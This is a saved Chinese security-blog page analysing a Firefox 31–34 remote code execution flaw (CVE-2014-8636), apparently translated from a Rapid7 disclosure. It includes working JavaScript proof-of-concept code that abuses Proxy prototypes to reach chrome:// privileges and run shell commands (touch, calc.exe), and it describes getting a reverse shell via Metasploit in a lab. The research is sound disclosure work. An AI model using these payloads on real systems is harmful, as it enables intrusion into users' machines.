@@ -1,0 +1,365 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>Firefox 31~34远程命令执行漏洞的分析 | 离别歌</title>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/styles.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/style.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/jquery.min.js"></script>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/code.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/button.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./Firefox 31~34远程命令执行漏洞的分析  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;text=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;title=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;is_video=false&amp;description=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;title=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;title=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;title=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;title=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/firefox-remote-command-execute.html&amp;name=Firefox%2031%7E34%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">Firefox 31~34远程命令执行漏洞的分析</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2015年3月27日 21:39" itemprop="datePublished">
+                    2015 三月 27 21:39
+                </time>
+</div>
+<div class="article-tag">
+            阅读：3732
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">命令执行漏洞</a>,
+                
+                <a class="tag-link" href="/tag/%E6%B5%8F%E8%A7%88%E5%99%A8">浏览器</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>这是我根据Tod Beardsley在metsaploit上发表的一篇文章，翻译+测试完成的分析，因为最近在研究浏览器漏洞，所以会更加关注浏览器这块。</p>
+<p>前段时间，二哥在很多浏览器中将脚本层面的漏洞提升为远程命令执行，几乎日遍市面上所有国产浏览器，这成为了许多人津津乐道的话题。确实，在当今这个底层安全防护越来越强的环境下，堆栈溢出、UAF造成的漏洞利用起来变得很困难，但如果借助浏览器提供的一些脚本层接口做到RCE，将是一个四两拨千金的过程。</p>
+<p>CVE-2014-8638就是这样一个漏洞，而且影响到的不是国(shan)产(zhai)浏览器，而是大名鼎鼎的Firefox。它也是javascript逐步进入ECMAScript 6时代后遇到的一个比较有意思的漏洞。</p>
+<h2 id="0x01"><a class="toclink" href="#0x01">0x01 漏洞的发现</a></h2>
+<p>Firefox是较早引入ECMAScript 6特性的浏览器，Proxy（<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy</a>）就是一个ECMAScript 6特性，它可以用来hook javascript原生的get/set方法。比如如下代码：</p>
+<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="p">{};</span>  
+<span class="kd">var</span> <span class="nx">p</span> <span class="o">=</span> <span class="nb">Proxy</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span> <span class="p">{</span>  
+  <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>  
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'getter called!'</span><span class="p">);</span>  
+    <span class="k">return</span> <span class="s1">'intercepted'</span><span class="p">;</span>  
+  <span class="p">},</span>  
+  <span class="nx">set</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>  
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'setter called!'</span><span class="p">);</span>  
+  <span class="p">}</span>  
+<span class="p">});</span>  
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">foo</span><span class="p">);</span>  
+<span class="nx">p</span><span class="p">.</span><span class="nx">bar</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</pre></div>
+<p>执行后将会得到如下结果：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/29551427463710.png"><img alt="image001.png" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/29551427463710.png"/></a></p>
+<p>这个方法为javascript注入了新的血液，但也带来了新的安全问题。Getter和Setter将导致我们将没有特权的javascript代码注入到有特权的javascript代码之前，这些代码在后面检查权限的函数之前，所以他们是有特权的。Chrome下也出现过由于这个原因导致的问题：<a href="https://code.google.com/p/chromium/issues/detail?id=351787"><a href="https://code.google.com/p/chromium/issues/detail?id=351787">https://code.google.com/p/chromium/issues/detail?id=351787</a></a>、<a href="http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/"><a href="http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/">http://researchcenter.paloaltonetworks.com/2014/12/google-chrome-exploitation-case-study/</a></a>大家也可以下去自己研究一下。</p>
+<p>经过作者的研究，当我们把Proxy对象作为其他对象的prototype时，就会出现一些问题，比如如下代码就能宕掉服务器：</p>
+<div class="codehilite"><pre><span></span><span class="nb">document</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nb">Proxy</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span><span class="nx">getPropertyDescriptor</span><span class="o">:</span><span class="kd">function</span><span class="p">(){</span> <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{}</span> <span class="p">}});</span>  
+</pre></div>
+<p>不过除此之外，作者当时并没有想到更好的利用方法，所以就提交到mozilla官方了，firefox在35版本修复了这个问题。</p>
+<h2 id="0x02"><a class="toclink" href="#0x02">0x02 突破点</a></h2>
+<p>作者后来做了如下尝试：</p>
+<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">props</span> <span class="o">=</span> <span class="p">{};</span>  
+<span class="nx">props</span><span class="p">[</span><span class="s1">'has'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>  
+<span class="kd">var</span> <span class="nx">chromeWin</span> <span class="o">=</span> <span class="nx">open</span><span class="p">(</span><span class="s2">"chrome://browser/content/browser.xul"</span><span class="p">,</span> <span class="s2">"x"</span><span class="p">)();</span>  
+<span class="p">};</span>  
+<span class="nb">document</span><span class="p">.</span><span class="nx">__proto__</span> <span class="o">=</span> <span class="nb">Proxy</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">props</span><span class="p">)</span>  
+</pre></div>
+<p>惊奇的发现，当我们在Proxy中，尝试打开一个特权页面“chrome://browser/content/browser.xul”的时候，居然只是弹出了“阻止窗口弹出”的提醒。这说明特权页面是可以被轻易打开的，这个提醒也可以通过点击页面的方式绕过。</p>
+<h2 id="0x03-chrome"><a class="toclink" href="#0x03-chrome">0x03 chrome:意味着什么</a></h2>
+<p>我们能够打开一个域为chrome://browser/content/browser.xul的页面，以为着什么？</p>
+<p>火狐和其他很多浏览器一样，都有自己的特权域。不同的URI schemes意味着不同的权限。Chromium的特权域是chrome://downloads，Safari的是file://。Firefox的特权域是chrome://，只要在这个域下的javascript拥有浏览器的最高权限。所以我们能用这样的javascript干很多事，比如执行shell命令。</p>
+<p>你可以试着打开chrome://browser/content/browser.xul并在控制台下执行如下代码（linux/osx）：</p>
+<div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">runCmd</span><span class="p">(</span><span class="nx">cmd</span><span class="p">)</span> <span class="p">{</span>  
+    <span class="kd">var</span> <span class="nx">process</span> <span class="o">=</span> <span class="nx">Components</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="s2">"@mozilla.org/process/util;1"</span><span class="p">]</span>  
+              <span class="p">.</span><span class="nx">createInstance</span><span class="p">(</span><span class="nx">Components</span><span class="p">.</span><span class="nx">interfaces</span><span class="p">.</span><span class="nx">nsIProcess</span><span class="p">);</span>  
+    <span class="kd">var</span> <span class="nx">sh</span> <span class="o">=</span> <span class="nx">Components</span><span class="p">.</span><span class="nx">classes</span><span class="p">[</span><span class="s2">"@mozilla.org/file/local;1"</span><span class="p">]</span>  
+            <span class="p">.</span><span class="nx">createInstance</span><span class="p">(</span><span class="nx">Components</span><span class="p">.</span><span class="nx">interfaces</span><span class="p">.</span><span class="nx">nsILocalFile</span><span class="p">);</span>  
+    <span class="nx">sh</span><span class="p">.</span><span class="nx">initWithPath</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">);</span>  
+    <span class="nx">process</span><span class="p">.</span><span class="nx">init</span><span class="p">(</span><span class="nx">sh</span><span class="p">);</span>  
+    <span class="kd">var</span> <span class="nx">args</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"-c"</span><span class="p">,</span> <span class="nx">cmd</span><span class="p">];</span>  
+    <span class="nx">process</span><span class="p">.</span><span class="nx">run</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="nx">args</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>  
+<span class="p">}</span>  
+<span class="nx">runCmd</span><span class="p">(</span><span class="s2">"touch /tmp/owned"</span><span class="p">);</span>  
+</pre></div>
+<p>执行后，可以发现/tmp/owned已经创建，touch命令执行成功。</p>
+<p>所以，一旦攻击者能够将代码注入到这个页面，就可以执行任意命令了。</p>
+<h2 id="0x04"><a class="toclink" href="#0x04">0x04 注入代码</a></h2>
+<p>那么怎么注入代码到这个页面？</p>
+<p>众所周知，浏览器同源策略（SOP）将不会允许我们在http://attacker域下注入代码到chrome://browser域下。非常幸运的是，作者以前就做过类似的研究：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/browser/firefox_webidl_injection.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/browser/firefox_webidl_injection.rb</a></p>
+<p>当open的第三个参数有传入”chrome”的话，并且在拥有特权的docshell（<a href="http://www-archive.mozilla.org/projects/embedding/docshell.html">http://www-archive.mozilla.org/projects/embedding/docshell.html</a>）下调用，那么我们的URL就会以“top-level frame”的形式被打开（形似“首选项”那种页面），并且没有传统的document对象（就是一个白白的面板）。这样的窗口，拥有一个messageManager属性，能够访问其他docshell（特权是通行的~嘿）：</p>
+<div class="codehilite"><pre><span></span><span class="c1">// abuse vulnerability to open window in chrome://  </span>
+<span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mozRTCPeerConnection</span><span class="p">;</span>  
+<span class="nx">c</span><span class="p">.</span><span class="nx">createOffer</span><span class="p">(</span><span class="kd">function</span><span class="p">(){},</span><span class="kd">function</span><span class="p">(){</span>  
+  <span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">'chrome://browser/content/browser.xul'</span><span class="p">,</span> <span class="s1">'top'</span><span class="p">,</span> <span class="s1">'chrome'</span><span class="p">);</span>  
+
+  <span class="c1">// we can now reference the `messageManager` property of the window's parent  </span>
+  <span class="nx">alert</span><span class="p">(</span><span class="nx">w</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">messageManager</span><span class="p">)</span>  
+<span class="p">});</span>  
+</pre></div>
+<p>messageManager是firefox中的特权API，能够在线程间传递信息。同样，javascript也是可以传递的，方式是使用loadFrameScript函数。</p>
+<h2 id="0x05"><a class="toclink" href="#0x05">0x05 命令执行</a></h2>
+<p>作者其实这块写的特别简略，直接告诉我可以怎样写metasploit exploit，可明明POC都没告诉我呀！！对于我这种没开发过firefox插件、没读过源码的通知简直就……我想到一张操蛋的图：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/25ae1427463716.png"><img alt="image003.png" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/thum-25ae1427463716.png"/></a></p>
+<p>对，就像这样……</p>
+<p>于是我更新了metasploit，生成了一个exploit来研究。得出了如下的POC：</p>
+<div class="codehilite"><pre><span></span><span class="cp">&lt;!doctype html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"zqwessa123"</span><span class="o">:</span> <span class="s2">"\n         (function(){var process = Components.classes[\"@mozilla.org/process/util;1\"].createInstance(Components.interfaces.nsIProcess);var sh = Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);sh.initWithPath(\"C:\\\\windows\\\\system32\\\\cmd.exe\");process.init(sh);\nvar shell='calc.exe';var args = [\"\/c\", shell];\n process.run(true, args, args.length);})();\n\n"</span><span class="p">};</span>
+<span class="kd">var</span> <span class="nx">key</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">[</span><span class="s1">'zqwessa123'</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">props</span> <span class="o">=</span> <span class="p">{};</span>
+<span class="nx">props</span><span class="p">.</span><span class="nx">has</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">){</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">window</span><span class="p">.</span><span class="nx">top</span><span class="p">.</span><span class="nx">x</span> <span class="o">&amp;&amp;</span> <span class="nx">n</span><span class="o">==</span><span class="s1">'nodeType'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">window</span><span class="p">.</span><span class="nx">top</span><span class="p">.</span><span class="nx">x</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"chrome://browser/content/browser.xul"</span><span class="p">,</span> <span class="s2">"x"</span><span class="p">,</span>
+        <span class="s2">"chrome"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">top</span><span class="p">.</span><span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nb">Object</span><span class="p">.</span><span class="nx">setPrototypeOf</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span> <span class="nx">pro</span><span class="p">);</span>
+        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+          <span class="nx">x</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">'data:text/html,&lt;iframe mozbrowser src="about:blank"&gt;&lt;/iframe&gt;'</span><span class="p">;</span>
+          <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+            <span class="nx">x</span><span class="p">.</span><span class="nx">messageManager</span><span class="p">.</span><span class="nx">loadFrameScript</span><span class="p">(</span><span class="s1">'data:,'</span><span class="o">+</span><span class="nx">key</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+            <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+                <span class="nx">x</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+            <span class="p">},</span><span class="mi">100</span><span class="p">);</span>
+          <span class="p">},</span> <span class="mi">100</span><span class="p">)</span>
+        <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">pro</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">getPrototypeOf</span><span class="p">(</span><span class="nb">document</span><span class="p">);</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nx">setPrototypeOf</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span> <span class="nb">Proxy</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="nx">props</span><span class="p">));</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  The page has moved. <span class="p">&lt;</span><span class="nt">span</span> <span class="na">style</span><span class="o">=</span><span class="s">'text-decoration:underline;'</span><span class="p">&gt;</span>Click here<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span> to be redirected.
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+<p>过程还是比较简单，首先创建Proxy对象，实现has方法，has方法实际上就是hook了对象的“in”操作，具体可见Proxy文档。然后将document的prototype设置为Proxy对象，这样实际上我们接管了document的in操作，并且这些代码是有特权的。</p>
+<p>使用之前讲的方法打开chrome://browser/content/browser.xul，获得了messageManager属性，用data协议构造了一个iframe，并将要执行的javascript代码也以data协议的形式用messageManager. loadFrameScript加载，执行特权API。</p>
+<p>注意，因为在docshell中，所以是没有传统的window对象、document对象，所以你调用alert、console等方法是没用的。opts对象中的那一串javascript就是最后执行的特权API，通过process.run执行C:\windows\System32\cmd.exe /c calc.exe，效果是弹出一个小计算器：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/f3c81427463721.png"><img alt="image005.png" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/thum-f3c81427463721.png"/></a></p>
+<p>一个简单的POC就此诞生了。</p>
+<p>然后，不得不说metesploit中的 firefox_proxy_prototype模块，通过这个模块生成的exploit可以直接反弹shell。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/46071427463724.png"><img alt="image007.png" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/thum-46071427463724.png"/></a></p>
+<p>虚拟机10.211.55.3上Firefox版本是33，在影响范围内，打开http:// 10.211.55.2:12306/m0EbugSmqwCW1PP ，随意点击一处，即可触发。</p>
+<p>主机上等待上线：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201503/7dfd1427463730.png"><img alt="image009.png" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/thum-7dfd1427463730.png"/></a></p>
+<p>这边反弹成功，可以看到，已经拿下10.211.55.3的用户权限shell。</p>
+<h2 id="0x06"><a class="toclink" href="#0x06">0x06 资料</a></h2>
+<p>原文：<a href="https://community.rapid7.com/community/metasploit/blog/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-8636">https://community.rapid7.com/community/metasploit/blog/2015/03/23/r7-2015-04-disclosure-mozilla-firefox-proxy-prototype-rce-cve-2014-8636</a> </p>
+<p>测试的FF33我在这里下载的：<a href="http://dl.pconline.com.cn/html_2/1/104/id=42964&amp;pn=0.html">http://dl.pconline.com.cn/html_2/1/104/id=42964&amp;pn=0.html</a></p>
+<p>Windows下的POC：<a href="http://mhz.pw/game/firefox/firefox.html">http://mhz.pw/game/firefox/firefox.html</a> </p>
+<p>一个小演示：<a href="https://www.youtube.com/watch?v=18xCIXkhF-E">https://www.youtube.com/watch?v=18xCIXkhF-E</a></p>
+<p>还有很多点，作者虽然没在本文说明，但基本都可以从作者文章链接所指向的文章看到。显然作者对浏览器漏洞的研究是一个过程，就像一部动漫，如果你不看前面的部分，这部分内容就可能比较难懂。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2150">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/c374a7d37b5bc757382f906b21158375.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://fei.0day5.com" target="_blank">小飞</a>
+<time datetime="2015年6月19日 18:35" itemprop="datePublished">
+                            2015 六月 19 18:35
+                        </time>
+<a href="javascript:reply_to('2150', '小飞')">回复</a>
+</p>
+<p class="comment-meta">今晚我也捣鼓捣鼓</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-2151">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">大飞</a>
+<time datetime="2015年6月19日 19:32" itemprop="datePublished">
+                            2015 六月 19 19:32
+                        </time>
+<a href="javascript:reply_to('2151', '大飞')">回复</a>
+</p>
+<p class="comment-meta">@小飞：今晚我也捣鼓捣鼓</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-2061">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/c8e1e5dfbddb46fad203b16f5dcdfa62.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://wrfly.kfd.me" target="_blank">mr</a>
+<time datetime="2015年5月10日 01:30" itemprop="datePublished">
+                            2015 五月 10 01:30
+                        </time>
+<a href="javascript:reply_to('2061', 'mr')">回复</a>
+</p>
+<p class="comment-meta">一楼明目张胆挂链接......<br><br><br/>点开之后我就成为了百万富翁（津巴布韦币）</br></br></p>
+</div>
+</div>
+<div class="row" id="comment-2017">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/510f3eac7116915ec7495c370163f63d.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.datongseo.cn/" target="_blank">大同SEO</a>
+<time datetime="2015年4月9日 17:31" itemprop="datePublished">
+                            2015 四月 09 17:31
+                        </time>
+<a href="javascript:reply_to('2017', '大同SEO')">回复</a>
+</p>
+<p class="comment-meta">直接看不懂，太高端啦，我就是用的火狐啊</p>
+</div>
+</div>
+<div class="row" id="comment-2007">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./Firefox 31~34远程命令执行漏洞的分析  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">L_AnG</a>
+<time datetime="2015年4月1日 21:34" itemprop="datePublished">
+                            2015 四月 01 21:34
+                        </time>
+<a href="javascript:reply_to('2007', 'L_AnG')">回复</a>
+</p>
+<p class="comment-meta">666,前排膜拜</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="12f2a39b81eaf57226dfa72db381fc3f3c267f55"/>
+</div><div class="col-xs-4">
